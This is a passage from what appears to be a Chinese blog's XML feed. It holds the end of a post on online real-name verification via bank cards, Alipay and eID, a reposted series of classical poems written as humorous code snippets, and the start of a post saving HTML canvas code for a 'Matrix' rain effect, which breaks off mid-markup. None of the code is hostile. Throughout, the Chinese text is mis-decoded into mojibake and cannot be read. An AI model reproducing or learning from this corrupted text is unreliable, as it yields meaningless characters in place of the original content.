ç»‘å®šé“¶è¡Œå¡</h2><p>é“¶è¡Œå¡å¼€æˆ·æ—¶ï¼ŒæŸœå‘˜ä¼šè¿›è¡Œå®åè®¤è¯ï¼ŒåŒ…æ‹¬èº«ä»½è¯æœ‰æ•ˆæ€§å’ŒçœŸå®æ€§è®¤è¯ï¼Œèº«ä»½è¯æ˜¯å¦æœ¬äººç­‰ã€‚é“¶è¡Œçš„å®åä¿¡æ¯ç›¸å¯¹å¯é ï¼Œå› æ­¤ï¼Œç½‘ç»œå®åè®¤è¯å°±å¯ä»¥æ ¹æ®ç”¨æˆ·åœ¨å¼€æˆ·æ—¶çš„é“¶è¡Œé¢„ç•™ä¿¡æ¯éªŒè¯æ¥è¿›è¡Œå®åè®¤è¯</p><p>è¿™ç§æ–¹å¼ç›¸å¯¹å®‰å…¨æ€§æœ€é«˜ï¼ŒåŒæ—¶è®¤è¯è¿‡ç¨‹ä¹Ÿæ˜¯æœ€å¤æ‚çš„ã€‚å¦‚æœç½‘ç«™æ²¡æœ‰æ”¯ä»˜åŠŸèƒ½ï¼Œåªæ˜¯åŒ¿åç”¨æˆ·ä¼šç»å¸¸å‘è¡¨ä¸€äº›æ”¿æ²»æ•æ„Ÿè¯é¢˜ï¼Œå¯¼è‡´ç½‘ç«™æœ‰è¢«æŸ¥å°çš„é£é™©ï¼Œæ­¤æ—¶æˆ‘ç”¨è¿™ç§æ–¹å¼å®åè®¤è¯å°±æœ‰äº›å¤§é¢˜å°åšäº†ã€‚å¦ä¸€æ–¹é¢ï¼Œæœ‰äº›ç”¨æˆ·çš„é“¶è¡Œé¢„ç•™ä¿¡æ¯å¯èƒ½å¤ªä¹…è€Œæ¨¡ç³Šï¼Œä¼šé€ æˆè¿™æ ·ä¸€äº›ç”¨æˆ·çš„è®¤è¯å›°éš¾ï¼Œè¿›è€Œé€ æˆè¿™éƒ¨åˆ†ç”¨æˆ·çš„æµå¤±ã€‚</p><h2 id="4-ä½¿ç”¨æ”¯ä»˜å®å®åè®¤è¯"><a href="#4-ä½¿ç”¨æ”¯ä»˜å®å®åè®¤è¯" class="headerlink" title="4. ä½¿ç”¨æ”¯ä»˜å®å®åè®¤è¯"></a>4. ä½¿ç”¨æ”¯ä»˜å®å®åè®¤è¯</h2><p>å¦‚ä»Šï¼Œå‡ ä¹å›½å†…ç»å¤§å¤šæ•°çš„ä¸Šç½‘ç”¨æˆ·éƒ½æ‹¥æœ‰æ”¯ä»˜å®è´¦æˆ·ï¼Œè€Œä½¿ç”¨æ”¯ä»˜å®çš„å‰æå°±æ˜¯è¦ç»‘å®šé“¶è¡Œå¡ï¼Œä»è€Œå®Œæˆäº†æ”¯ä»˜å®çš„å®åè®¤è¯ã€‚</p><p>å½“æ”¯ä»˜å®ç§¯ç´¯äº†è¶³å¤Ÿå¤šçš„å¯ä¿¡ç”¨æˆ·åï¼Œå®ƒå°±å¯ä»¥æ‰©å±•ä¸€äº›èƒ½åŠ›ï¼Œå¦‚ä¸ºç¬¬ä¸‰æ–¹æä¾›å®åè®¤è¯èƒ½åŠ›ï¼Œé€šè¿‡ç”¨æˆ·åœ¨æ——ä¸‹ç½‘ç«™çš„è¡Œä¸ºè¿›è¡Œç”¨æˆ·ç”»åƒç­‰ã€‚</p><p>ç°åœ¨ï¼Œæ”¯ä»˜å®å·²ç»æ¨å‡ºäº†<a href="https://docs.open.alipay.com/271" target="_blank" rel="noopener">èŠéº»è®¤è¯</a>æœåŠ¡ï¼Œæ ¹æ®å…¶ä»‹ç»</p><blockquote><p>å¯¹ä¸ªäººè¿›è¡Œå®äººè®¤è¯ï¼Œæ ¸éªŒæ–¹å¼åŒ…æ‹¬äººè„¸è¯†åˆ«ã€çœ¼çº¹è¯†åˆ«ã€å§“åå’Œèº«ä»½è¯å·éªŒè¯ç­‰ã€‚èŠéº»è®¤è¯ä¸»è¦è§£å†³çº¿ä¸Šå®äººå¼€æˆ·ã€å¸å·å®åè®¤è¯ã€å¸å·å®äººç™»å½•ç­‰åœºæ™¯ä¸­ä¸ªäººèº«ä»½çš„è¯†åˆ«é—®é¢˜ã€‚ä¸å…¶ä»–å®äººè®¤è¯æœåŠ¡ç›¸æ¯”ï¼ŒèŠéº»è®¤è¯åœ¨ä½¿ç”¨æµç¨‹ä¸­ç”šè‡³ä¸éœ€è¦ç”¨æˆ·åšåŠ¨ä½œå°±èƒ½å¿«é€Ÿå¾—å‡ºè®¤è¯ç»“æœï¼Œé€Ÿåº¦å¿«ã€ä½“éªŒå¥½ã€é€šè¿‡ç‡é«˜ï¼Œæ‹¥æœ‰ä¸šå†…ç‹¬æœ‰çš„çœ¼çº¹äººè„¸åŒå› å­è®¤è¯æŠ€æœ¯ï¼Œå®‰å…¨æ°´å¹³å·²è¾¾é‡‘èçº§è¦æ±‚ã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™å·²ç»æ»¡è¶³äº†å¤§å¤šæ•°çš„ç½‘ç»œå®åè®¤è¯åœºæ™¯ï¼Œä¸”é€Ÿåº¦å¿«ï¼Œä½“éªŒå¥½ï¼Œä½œå¼Šéš¾ã€‚æ´»ä½“è®¤è¯æ—¢è§£å†³äº†å†’ç”¨çš„é—®é¢˜ï¼Œä¹Ÿè§£å†³äº†ç”¨æˆ·æ´»ä½“çš„è®¤è¯é—®é¢˜ï¼Œè€Œä¸”æ•´ä¸ªè®¤è¯è¿‡ç¨‹åªéœ€ä¸¤æ­¥ï¼šæ‰«ç  ==&gt; æ‰«è„¸ ==&gt; å®Œæˆã€‚</p><p>ç°åœ¨çš„ä¸€äº›å®åè®¤è¯æˆ‘éƒ½æœ‰äº›è­¦æƒ•ï¼Œæœ‰äº›è¿httpséƒ½ä¸æ”¯æŒçš„ç½‘ç«™éƒ½è¦æ”¶é›†ä¸ªäººä¿¡æ¯ï¼Œä½ çš„ä¿¡æ¯åœ¨æ•°æ®åº“é‡Œæ›´å¯èƒ½æ˜¯æ˜æ–‡å­˜å‚¨çš„ï¼Œé€ æˆäº†å¾ˆå¤§çš„å®‰å…¨é£é™©ã€‚ä½†ç°åœ¨å›½å†…çš„å¸¸ç”¨ç½‘ç«™ç°åœ¨è¿˜æœ‰å‡ ä¸ªä¸è¦æ±‚å®åè®¤è¯çš„ï¼Ÿ</p><h2 id="5-æœªæ¥ï¼šeID"><a href="#5-æœªæ¥ï¼šeID" class="headerlink" title="5. æœªæ¥ï¼šeID"></a>5. æœªæ¥ï¼šeID</h2><p><a href="https://eid.cn/" target="_blank" rel="noopener">eID</a> (electronic IDentity) æ˜¯ä»¥å¯†ç æŠ€æœ¯ä¸ºåŸºç¡€ã€ä»¥æ™ºèƒ½å®‰å…¨èŠ¯ç‰‡ä¸ºè½½ä½“ã€ç”±â€œå…¬å®‰éƒ¨å…¬æ°‘ç½‘ç»œèº«ä»½è¯†åˆ«ç³»ç»Ÿâ€ç­¾å‘çš„å…¬æ°‘ç½‘ç»œç”µå­èº«ä»½æ ‡è¯†ï¼Œèƒ½å¤Ÿåœ¨ä¸æ³„éœ²èº«ä»½ä¿¡æ¯çš„å‰æä¸‹åœ¨çº¿è¿œç¨‹è¯†åˆ«èº«ä»½ã€‚eID ä¸ä»…åœ¨ä¸­å›½æ”¯æŒï¼Œè¿˜æ˜¯ä¸€ä¸ªå…¨çƒè§£å†³æ–¹æ¡ˆï¼Œæ—©åœ¨ 1999 å¹´ï¼Œæ¬§ç›Ÿå°±å·²ç»æ”¯æŒï¼Œä»¥ä¸‹æ˜¯ä¸€äº›ä¸»è¦å›½å®¶çš„æ”¯æŒæƒ…å†µã€‚</p><ul><li>1999 æ¬§ç›Ÿ </li><li>2004 ä¸­å›½é¦™æ¸¯ </li><li>2004 æ¾³å¤§åˆ©äºš </li><li>2011 ä¿„ç½—æ–¯ </li><li>2013 åŠ æ‹¿å¤§ </li><li>2014 ç¾å›½ </li></ul><p>ç›®å‰ï¼ŒeIDï¼Œåœ¨å¾·å›½æ™®åŠç‡è¾ƒå¥½ï¼Œå›½å†…å°šæœªæ™®åŠï¼Œä½†ä¸­å›½æ‰‹æœºåˆ¶é€ å•†åä¸º(è£è€€)ã€OPPOã€Vivo æœ€æ–°æ¬¾å‡å·²æ”¯æŒï¼Œå¸Œæœ›å·¥ä¿¡éƒ¨èƒ½æ¨è¿›ä¸€ä¸‹ eID çš„æ™®åŠï¼Œè¿ Facebook è¿™æ ·çš„å…¬å¸éƒ½æ»¥ç”¨ç”¨æˆ·ä¿¡æ¯ï¼Œæ›´é‘è®ºä¸çŸ¥åçš„å…¬å¸äº†ã€‚</p><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://en.wikipedia.org/wiki/Electronic_identification" target="_blank" rel="noopener">Electronic identification - WikiPedia</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> éšç¬”æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€è½¬ã€‘æ–‡è‰ºçš„ä»£ç </title>
      <link href="/post/funny-code/"/>
      <url>/post/funny-code/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g9acekmjqvj31900u0jyy.jpg" alt=""></p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> world;               <span class="comment">// äºŒäººä¸–ç•Œ</span></span><br><span class="line">unsigned letter;            <span class="comment">// æœªç­¾åçš„ä¿¡ç¬º</span></span><br><span class="line"><span class="keyword">short</span> stay;                 <span class="comment">// çŸ­æš‚çš„ç¼±ç»»</span></span><br><span class="line"><span class="keyword">long</span> memories;              <span class="comment">// é•¿ä¹…çš„å›å¿†</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ago;              <span class="comment">// å¾ˆä¹…å¾ˆä¹…ä»¥å‰</span></span><br><span class="line"><span class="keyword">float</span> cloud;                <span class="comment">// å¤©ç©ºæ¼‚æµ®ç€ä¸€æœµäº‘</span></span><br><span class="line">printf(<span class="string">"I miss you.\n"</span>);    <span class="comment">// ä¸Šè¾¹å†™ç€ï¼šI miss u.</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (everynight <span class="keyword">in</span> mydreams) &#123;</span><br><span class="line">    i.see(you);</span><br><span class="line">    i.feel(you);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> world <span class="keyword">where</span> someone <span class="keyword">like</span> <span class="string">'%you%'</span>;</span><br></pre></td></tr></table></figure><p>Nothing is absolute.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line">* &#123; <span class="attribute">position</span>: relative; &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>ç‰©æ˜¯äººéäº‹äº‹ä¼‘ï¼Œæ¬²è¯­æ³ªå…ˆæµã€‚</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(item &amp;&amp; !people) everything = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (tears.setFlowing()) <span class="keyword">try</span> &#123;</span><br><span class="line">    Speaker skr = <span class="keyword">new</span> <span class="type">Speaker</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> &#123;</span><br><span class="line">    IOException e;</span><br><span class="line">&#125; ()</span><br></pre></td></tr></table></figure><p>å…ˆå¤©ä¸‹ä¹‹å¿§è€Œå¿§ï¼Œåå¤©ä¸‹ä¹‹ä¹è€Œä¹ã€‚</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (others.rejoice() == <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">self</span>.rejoice();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">self</span>.worry();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯»å¯»è§…è§…ï¼Œå†·å†·æ¸…æ¸…ï¼Œå‡„å‡„æƒ¨æƒ¨æˆšæˆšã€‚</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">Seeking</span><span class="literal">+</span><span class="literal">+</span><span class="comment">;</span></span><br><span class="line"><span class="comment">Loneliness</span><span class="literal">+</span><span class="literal">+</span><span class="comment">;</span></span><br><span class="line"><span class="comment">(Misery</span><span class="literal">+</span><span class="literal">+</span><span class="comment">)</span> <span class="literal">+</span> <span class="comment">(Sadness</span><span class="literal">+</span><span class="literal">+</span><span class="comment">);</span></span><br></pre></td></tr></table></figure><p>é‡ç«çƒ§ä¸å°½ï¼Œæ˜¥é£å¹åˆç”Ÿã€‚</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(true) &#123;</span><br><span class="line">    Grass *gr;</span><br><span class="line">    <span class="keyword">if</span> (springBreeze.isComing()) &#123;</span><br><span class="line">        gr = <span class="keyword">new</span> Grass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wildFire.isComing()) &#123;</span><br><span class="line">        <span class="keyword">delete</span> gr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡ä½œçœŸæ—¶çœŸäº¦å‡ï¼Œæ— ä¸ºæœ‰å¤„æœ‰è¿˜æ— ã€‚</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">FALSE</span> == <span class="literal">true</span>) <span class="literal">TRUE</span> = <span class="literal">false</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == exist) exist = <span class="literal">NULL</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><p>æ¬²ç©·åƒé‡Œç›®ï¼Œæ›´ä¸Šä¸€å±‚æ¥¼ã€‚</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sight.getRange() &lt;= <span class="number">1000</span>) building.level++;</span><br></pre></td></tr></table></figure><p>æ˜æ—¥å¤æ˜æ—¥ï¼Œæ˜æ—¥ä½•å…¶å¤šã€‚æˆ‘ç”Ÿå¾…æ˜æ—¥ï¼Œä¸‡äº‹æˆè¹‰è·ã€‚</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (tomorrow.hasNext()) &#123;</span><br><span class="line">    howMany(tomorrow);</span><br><span class="line">    tomorrow.next();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.wait(WHOLE_LIFE);</span><br><span class="line"><span class="keyword">return</span> (<span class="literal">null</span> == everything) ? <span class="literal">null</span> : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>è·¯æ¼«æ¼«å…®ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">roadAheadEnding.isVisual = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (!spare<span class="constructor">Effort()</span>) &#123;</span><br><span class="line">    i.search<span class="constructor">With(<span class="params">willUnbending</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ„¿äººé•¿ä¹…ï¼Œåƒé‡Œå…±å©µå¨Ÿã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="keyword">BOOL)wish: </span>(People *) longNine &#123;</span><br><span class="line">    <span class="keyword">BOOL </span>km = YES<span class="comment">;</span></span><br><span class="line">    <span class="keyword">BOOL </span>moon = YES<span class="comment">;</span></span><br><span class="line">    return km &amp;&amp; moon<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸œé£ä¸ä¸å‘¨éƒä¾¿ï¼Œé“œé›€æ˜¥æ·±é”äºŒä¹”ã€‚</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!eastWind.help(zhouyu)) &#123;</span><br><span class="line">    season = spring<span class="comment">;</span></span><br><span class="line">    bronzeBird.<span class="keyword">lock</span>(bigQiao)<span class="comment">;</span></span><br><span class="line">    bronzeBird.<span class="keyword">lock</span>(smallQiao)<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤å²¸çŒ¿å£°å•¼ä¸ä½ï¼Œè½»èˆŸå·²è¿‡ä¸‡é‡å±±ã€‚</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    listen(Ape1Cry &amp;&amp; Ape2Cry);</span><br><span class="line">    Boat.pass(Mountain);</span><br><span class="line">    <span class="keyword">if</span> (Mountain &gt; <span class="number">10000</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¡ƒèŠ±æ½­æ°´æ·±åƒå°ºï¼Œä¸åŠæ±ªä¼¦é€æˆ‘æƒ…ã€‚</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">peachFlowerLake.deep = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">if</span> (peachFlowerLake.deep &lt; wl.friendship) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//è¿ç®—ç»“æœï¼štrue</span></span><br></pre></td></tr></table></figure><p>é»‘å¤œç»™äº†æˆ‘é»‘è‰²çš„çœ¼ç›ï¼Œæˆ‘å´ç”¨å®ƒæ¥å¯»æ‰¾å…‰æ˜ã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eye = dark.poll<span class="comment">()</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="comment">(eye.color == black)</span> &#123;</span><br><span class="line">    eye.seek_for<span class="comment">(bright)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é±¼å’Œç†ŠæŒä¸å¯å…¼å¾—ã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hold ? fish : <span class="type">palm</span>;</span><br></pre></td></tr></table></figure><p>ç¬‘æ¸ä¸é—»å£°æ¸æ‚„ï¼Œå¤šæƒ…å´è¢«æ— æƒ…æ¼ã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">laugh--<span class="comment">;</span></span><br><span class="line">sound--<span class="comment">;</span></span><br><span class="line">person(feeling &gt; <span class="number">999</span>).<span class="keyword">bothered_by(person(feeling </span>== <span class="number">0</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>ä¸¾å¤´æœ›æ˜æœˆï¼Œä½å¤´æ€æ•…ä¹¡ã€‚</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.Head.SetDirection(TheMoon.GetInstance().Position)) &#123;</span><br><span class="line">    <span class="keyword">this</span>.Head.SetDirection(GROUND_DIRECTION);</span><br><span class="line">    <span class="keyword">this</span>.ThinkAbout(<span class="keyword">this</span>.OriginalPlace);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ç›´åœ¨åšç¨‹åºå‘˜ï¼Œç›´åˆ°è†ç›–ä¸­äº†ä¸€ç®­ã€‚</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ActAs(Programmer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (KneeTilledException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.Weapon <span class="keyword">is</span> Arror) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠ½åˆ€æ–­æ°´æ°´æ›´æµï¼Œä¸¾æ¯æ¶ˆæ„æ„æ›´æ„ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cut<span class="constructor">Water(<span class="params">getKnife</span>()</span>) &#123;</span><br><span class="line">    water++;</span><br><span class="line">&#125;</span><br><span class="line">reduce<span class="constructor">Worry(<span class="params">toast</span>)</span> &#123;</span><br><span class="line">    worry++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é©¿å¯„æ¢…èŠ±ï¼Œé±¼ä¼ å°ºç´ ï¼Œç Œæˆæ­¤æ¨æ— é‡æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (received(<span class="keyword">friend</span>.plumBlossom) &amp;&amp; received(<span class="keyword">friend</span>.letter)) &#123;</span><br><span class="line">    nostalgicThoughts++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ä¸ºæµ®äº‘èƒ½è”½æ—¥ï¼Œé•¿å®‰ä¸è§ä½¿äººæ„ã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="comment">(cloudsHideSun == true)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="comment">(!seeChangan)</span> &#123;</span><br><span class="line">        self.worry<span class="comment">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äººç”Ÿå¾—æ„é¡»å°½æ¬¢ï¼Œè«ä½¿é‡‘æ¨½ç©ºå¯¹æœˆã€‚</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (life.satisfied()) &#123;</span><br><span class="line">    <span class="keyword">while</span> (happy--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!goldenCup.empty() &amp;&amp; moon.visible()) &#123;</span><br><span class="line">            goldenCup.fulfill();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‹Ÿåˆ©å›½å®¶ç”Ÿæ­»ä»¥ï¼Œå²‚å› ç¥¸ç¦é¿è¶‹ä¹‹ã€‚</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">dog</span>(pear -&gt; fruit)<span class="selector-class">.home</span><span class="selector-class">.deliver</span>(death, <span class="number">1</span>);</span><br><span class="line"><span class="selector-tag">flag</span> <span class="selector-tag">in</span> <span class="selector-attr">[ disaster, fortune ]</span> <span class="selector-tag">-</span>&gt; () &#123; <span class="selector-tag">pen</span><span class="selector-class">.go</span>(arguments[<span class="number">0</span>]) &#125;;</span><br></pre></td></tr></table></figure><hr><p>åŸæ–‡åœ°å€ï¼š<a href="https://mi.js.org/2018-04/%E6%96%87%E8%89%BA%E7%9A%84%E4%BB%A3%E7%A0%81/" target="_blank" rel="noopener">æ–‡è‰ºçš„ä»£ç  - ç±³ç±³çš„åšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> éšç¬”æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨ Canvas ç»˜åˆ¶é»‘å®¢å¸å›½æ•°å­—æ•ˆæœ</title>
      <link href="/post/matrix-number/"/>
      <url>/post/matrix-number/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1g9gjw2k3ahj30x00ik40v.jpg" alt=""></p><a id="more"></a><p>ä»Šå¤©åœ¨è®¿é—® <a href="https://api.pkupi.com/" target="_blank" rel="noopener">https://api.pkupi.com/</a> æ—¶ï¼Œå‘ç°é¡µé¢æ•ˆæœå¾ˆæ˜¯é…·ç‚«ï¼ŒæŸ¥çœ‹ whois æ˜¾ç¤ºåŸŸåå°†äº 3 å¤©ååˆ°æœŸï¼Œå°±å…ˆæŠŠæºç å¤‡ä»½ä¸‹æ¥ï¼Œä¸‡ä¸€ä»¥å<del>è£…é€¼</del>ç”¨å¾—ç€å‘¢</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"user-scalable=no, viewport-fit=cover"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 